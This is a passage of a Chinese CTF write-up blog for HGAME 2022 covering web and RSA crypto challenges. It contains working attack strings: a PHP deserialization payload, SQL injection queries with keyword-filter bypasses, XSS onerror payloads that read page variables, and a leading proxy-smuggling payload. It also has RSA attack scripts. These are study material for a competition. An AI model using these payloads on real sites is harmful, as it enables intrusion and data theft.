AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:&#x2F;&#x2F;internal.host&#x2F;</code></pre>

<p>但是网上的 exp 大多是 Apache 直接作为代理服务器的情况，这题给了 Apache 的配置文件 https-vhosts.conf , &#39;/&#39; 提供静态资源服务， &#39;/proxy&#39; 提供代理服务。</p>
<p>所以要在/proxy路径下用payload</p>
<h3 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140416825.png" alt="image-20220129140416825"></p>
<p>看源码，两次base64解码得到flag</p>
<pre class="language-none"><code class="language-none">hgame&#123;D0nt_f0r9et_2_ClOs3_S0urce_m@p&#125;</code></pre>

<h3 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h3><p>看源码有<a target="_blank" rel="noopener" href="http://www.zip的提示/">www.zip的提示</a></p>
<p>代码审计一下</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140800363.png" alt="image-20220129140800363"></p>
<p>简单的用户判断</p>
<p>绕过之后</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140849923.png" alt="image-20220129140849923"></p>
<p>看index.php</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129140911249.png" alt="image-20220129140911249"></p>
<p>大致逻辑就是将输入的传入get.php和save.php进行处理</p>
<p>save.php</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141059537.png" alt="image-20220129141059537"></p>
<p>将传入的单词的key和value写入文件中，并利用|来将key和value的序列化之后的值分隔。</p>
<p>get.php</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141542508.png" alt="image-20220129141542508"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141208348.png" alt="image-20220129141208348"></p>
<p>读取save.php中创建的文件的内容</p>
<p>evil.php</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129141359385.png" alt="image-20220129141359385"></p>
<p>看见wakeup方法，再联系get.php时的unserialize可以猜测这里是要利用反序列化让file=/flag然后令flag变量的值变为flag再利用get.php将其读出来</p>
<p>这里要注意序列化的内容要在填在单词的位置，将其作为数组的key而不是value，否则在encode函数时会对value再进行一次序列化导致payload改变，无法执行反序列化操作</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129184316177.png" alt="image-20220129184316177"></p>
<p>还要在反序列化的payload前添加|符号</p>
<p>让|后的部分执行decode函数中的反序列化</p>
<p>将evil类中的file赋值为/flag，从而让flag=/flag文件中的内容</p>
<p>这里的if过滤没啥用</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129185352257.png" alt="image-20220129185352257"></p>
<p>最终payload</p>
<pre class="language-php" data-language="php"><code class="language-php">&#123;|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;N;&#125;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129185511329.png" alt="image-20220129185511329"></p>
<h3 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223228959.png" alt="image-20220130223228959"></p>
<p>开始页面，源码里提示了个index?id=1</p>
<p>输到url上能看出来id的数决定了出现的是哪个精灵</p>
<p>当id不是1，2，3其中的数时会跳转到error.php</p>
<p>刚开始感觉是sql注入，注了半天这个页面没报错，这里id的值感觉是通过php的弱比较来判断的，开始怀疑是不是别的漏洞。</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223531260.png" alt="image-20220130223531260"></p>
<p>扫了一下扫到了db.php才确定就是sql注入</p>
<p>于是尝试在error界面注入</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223651689.png" alt="image-20220130223651689"></p>
<p>当code不为数字时会出现报错</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223713519.png" alt="image-20220130223713519"></p>
<p>刚开始没有给源码，试了好几次没试出来怎么注入</p>
<p>主办方给的源码：</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130223751805.png" alt="image-20220130223751805"></p>
<p>有了源码之后就是一个很简单的联合注入了</p>
<p>括号或者/*x*/替代空格，用like替代等于，双写绕过关键字，因为是数字型注入，所以也不需要注释符</p>
<p>爆库名</p>
<pre class="language-none"><code class="language-none">?code&#x3D;1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,database()</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221501997.png" alt="image-20220130221501997"></p>
<pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere(table_schema)like&#39;pokemon&#39;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221833846.png" alt="image-20220130221833846"></p>
<pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name)like&#39;fllllllllaaaaaag&#39;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130221937816.png" alt="image-20220130221937816"></p>
<pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,(flag)frfromom&#x2F;*x*&#x2F;fllllllllaaaaaa</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220130222120527.png" alt="image-20220130222120527"></p>
<h3 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板*"></a>At0m的留言板*</h3><p>xss漏洞</p>
<p>说起这个我就想起来b站那次的xss，还有我还没开始的js学习（</p>
<p>先试一下</p>
<pre class="language-none"><code class="language-none">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220205121248714.png" alt="image-20220205121248714"></p>
<p>确定是xss</p>
<p>然后主办方给了个hint</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211120719244.png" alt="image-20220211120719244"></p>
<p>输出用户留言位置的class标签名为content，然后还有一个用var定义的flag全局变量</p>
<p>为什么同样是两个变量，第一个使用let，而第二个使用var呢？因为使用 var 可 以利用 Object.keys(window) 拿到全局变量 flag 的变量名，而使用let的话无法获取。</p>
<p>也可以直接用Object.values(window)读取这些全局变量的内容，也就是直接获得flag</p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token string">"document.getElementsByClassName('content')[0].innerHTML= Object.values(window)"</span><span class="token operator">></span></code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211121033670.png" alt="image-20220211121033670"></p>
<p>由于提示里这个flag定义在了一个script标签里，我们也可以用document.scripts来读出script标签里的内容</p>
<pre class="language-none"><code class="language-none">&lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;) [0].innerText&#x3D;document.scripts[0].text;&quot;&gt;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220211124302100.png" alt="image-20220211124302100"></p>
<h2 id="CRYPTO-1"><a href="#CRYPTO-1" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA-Attack"><a href="#RSA-Attack" class="headerlink" title="RSA Attack"></a>RSA Attack</h3><p>rsa真是全套脚本就行</p>
<p>加密脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import getPrime
from libnum import s2n

from secret import flag

m &#x3D; s2n(flag)
e &#x3D; 65537
p &#x3D; getPrime(80)
q &#x3D; getPrime(80)
n &#x3D; p * q
c &#x3D; pow(m, e, n)
print(&quot;e &#x3D;&quot;, e)
print(&quot;n &#x3D;&quot;, n)
print(&quot;c &#x3D;&quot;, c)</code></pre>

<p>正常的rsa加密，给了e，n，c求m</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190127418.png" alt="image-20220129190127418"></p>
<p>在线网站分解n得到pq</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190208787.png" alt="image-20220129190208787"></p>
<pre class="language-none"><code class="language-none">import gmpy2
from libnum import n2s

def Decrypt(c, e, p, q):
   L &#x3D; (p - 1) * (q - 1)
   d &#x3D; gmpy2.invert(e, L)
   n &#x3D; p * q
   m &#x3D; gmpy2.powmod(c, d, n)
   flag &#x3D; n2s(int(m)
   print(flag)


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
   p &#x3D;  715800347513314032483037
   q &#x3D;  978782023871716954857211
   e &#x3D; 65537
   c &#x3D; 122622425510870177715177368049049966519567512708
   Decrypt(c, e, p, q)</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129190508606.png" alt="image-20220129190508606"></p>
<h3 id="RSA-Attack-2"><a href="#RSA-Attack-2" class="headerlink" title="RSA Attack 2"></a>RSA Attack 2</h3><p>加密脚本</p>
<pre class="language-none"><code class="language-none">import re
from math import ceil
from Crypto.Util.number import getPrime
from libnum import s2n

#flag_parts &#x3D; list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) &#x2F; 3)&#125;&#125;&#125;&quot;, flag)))

print(&quot;# task1&quot;)
m &#x3D; 42949244670170607238949839659191560916635942982341043413490558510
e &#x3D; 65537
p &#x3D; 118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123
q &#x3D; 123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411
r &#x3D; 169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833
n1 &#x3D; p * q
c1 &#x3D; pow(m, e, n1)
n2 &#x3D; r * q
c2 &#x3D; pow(m, e, n2)
print(&quot;e &#x3D;&quot;, e)
print(&quot;n1 &#x3D;&quot;, n1)
print(&quot;c1 &#x3D;&quot;, c1)
print(&quot;n2 &#x3D;&quot;, n2)
print(&quot;c2 &#x3D;&quot;, c2)

print(&quot;# task2&quot;)
m &#x3D; 26926584401348540331333678102939069838976561137078484378892509505
e &#x3D; 7
p &#x3D; getPrime(1024)
q &#x3D; getPrime(1024)
n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537
c &#x3D; pow(m, e, n)
print(&quot;e &#x3D;&quot;, e)
print(&quot;n &#x3D;&quot;, n)
print(&quot;c &#x3D;&quot;, c)

print(&quot;# task3&quot;)
m &#x3D; flag_parts[2]
p &#x3D; getPrime(1024)
q &#x3D; getPrime(1024)
n &#x3D; p * q
e1 &#x3D; getPrime(32)
e2 &#x3D; getPrime(32)
c1 &#x3D; pow(m, e1, n)
c2 &#x3D; pow(m, e2, n)
print(&quot;n &#x3D;&quot;, n)
print(&quot;e1 &#x3D;&quot;, e1)
print(&quot;c1 &#x3D;&quot;, c1)
print(&quot;e2 &#x3D;&quot;, e2)
print(&quot;c2 &#x3D;&quot;, c2)</code></pre>

<p>将flag分了三段后分别用了不同的加密方式</p>
<p><strong>第一段</strong></p>
<p>代码能看出n1和n2有共同的素因子，那么可以利用欧几里得算法直接将 n1 和 n2 分解。通过欧几里得算法可以直接求出 n1 和 n2 的最大公约数 p:</p>
<p>output给了e,n1,n2,c1,c2</p>
<pre class="language-none"><code class="language-none">def gcd(a, b):
    if a &lt; b:
        a, b &#x3D; b, a
    while b !&#x3D; 0:
        temp &#x3D; a % b
        a &#x3D; b
        b &#x3D; temp
    return a

def gcd_digui(a, b):
    if b !&#x3D; 0:
        return a
    return gcd(b, a % b)

n1 &#x3D; 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553
n2 &#x3D; 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363
p &#x3D; gcd(n1, n2)
q &#x3D; n1&#x2F;&#x2F;p
r &#x3D; n2&#x2F;&#x2F;p
print(p)
print(q)
print(r)</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129191322862.png" alt="image-20220129191322862"></p>
<pre class="language-none"><code class="language-none">p&#x3D;123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411

q&#x3D;118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123

r&#x3D;169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833</code></pre>

<p>这就相当于有了enc，带到前一个题的代码里得到</p>
<p>hgame{RsA@hAS!a&amp;VArIETY?of.</p>
<p><strong>第二段</strong></p>
<p>e=7像低加密指数分解攻击，直接开七次方</p>
<pre class="language-none"><code class="language-none">import gmpy2
from libnum import n2s

e &#x3D; 7
# 读入 n, 密文
n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537
c &#x3D; 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625

print(&#39;n&#x3D;&#39;, n)
print(&#39;c&#x3D;&#39;, c)

result &#x3D; gmpy2.iroot(c, 7)

print(&#39;  [-]The c has cubic root?&#39;, result[1])
if result[1]:
    print(&#39;  [-]The m is:&#39;, &#39;&#123;:x&#125;&#39;.format(result[0]))</code></pre>

<p>得到m = 0x41747461634b5e6d4554686f64535e776841543a6f746865722141</p>
<p>转字符串的为AttacK^mEThodS^whAT:other!A</p>
<p><strong>第三段</strong></p>
<p>共模攻击</p>
<pre class="language-none"><code class="language-none">from gmpy2 import *
from libnum import n2s

n &#x3D; 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729
e1 &#x3D; 2519901323
e2 &#x3D; 3676335737
s &#x3D; gcdext(e1, e2)
s1 &#x3D; s[1]
s2 &#x3D; -s[2]

c1 &#x3D; 3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870
c2 &#x3D; 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861
e2 &#x3D; 3676335737
c2 &#x3D; invert(c2, n)
m &#x3D; (pow(c1, s1, n) * pow(c2, s2, n)) % n
print(m)
print(n2s(int(m)))</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220129192505430.png" alt="image-20220129192505430"></p>
<p>最终flag</p>
<pre class="language-none"><code class="language-none">hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125;</code></pre>

<h1 id="第三周wp"><a href="#第三周wp" class="headerlink" title="第三周wp"></a>第三周wp</h1><h2 id="CRYPTO-2"><a href="#CRYPTO-2" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><p>这周密码比上周要简单</p>
<h3 id="Multi-Prime-RSA"><a href="#Multi-Prime-RSA" class="headerlink" title="Multi Prime RSA"></a>Multi Prime RSA</h3><p>加密脚本</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204171309886.png" alt="image-20220204171309886"></p>
<p>给了这除了flag其他的变量都给了</p>
<pre class="language-none"><code class="language-none">p &#x3D; 61789932148719477384027458333380568978056286136137829092952317307711908353477
q &#x3D; 91207969353355763685633284378833506319794714507027332929290701748727534193861
r &#x3D; 105471299607375388622347272479207944509670502835651250945203397530010861809367
s &#x3D; 83153238748903772448138307505579799277162652151244477391465130504267171881437
n &#x3D; 1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919
e &#x3D; 65537
c &#x3D; 844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</code></pre>

<p>直接找个rsa的解密脚本带进去就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204123448819.png" alt="image-20220204123448819"></p>
<h3 id="RSA-Attack-3"><a href="#RSA-Attack-3" class="headerlink" title="RSA Attack 3"></a>RSA Attack 3</h3><p>加密脚本</p>
<pre class="language-none"><code class="language-none">from Crypto.Util.number import getPrime
from gmpy2 import invert
from libnum import s2n
from secret import flag

p &#x3D; getPrime(2048)
q &#x3D; getPrime(2048)
n &#x3D; p * q
d &#x3D; getPrime(64)
e &#x3D; invert(d, (p - 1) * (q - 1))
c &#x3D; pow(s2n(flag), e, n)
print(f&quot;n &#x3D; &#123;n&#125;&quot;)
print(f&quot;e &#x3D; &#123;e&#125;&quot;)
print(f&quot;c &#x3D; &#123;c&#125;&quot;)
</code></pre>

<p>只给了nec，想要得到明文还要有d，要求d就要指定pq。</p>
<p>利用rsactftool求公钥私钥文件然后得到pq</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172702618.png" alt="image-20220204172702618"></p>
<p>得到公钥</p>
<pre class="language-none"><code class="language-none">-----BEGIN PUBLIC KEY-----
MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCAgB8YNfjXEOhimdPq0kh+WM0
IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+Gz
B13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NW
tkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYc
BMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;M
XamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OE
fZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQ
eWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEs
z6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzA
tWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0c
ZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208D
aIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUG
gMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn
6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;V
w03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI
38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGu
J+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1
h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;
vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCy
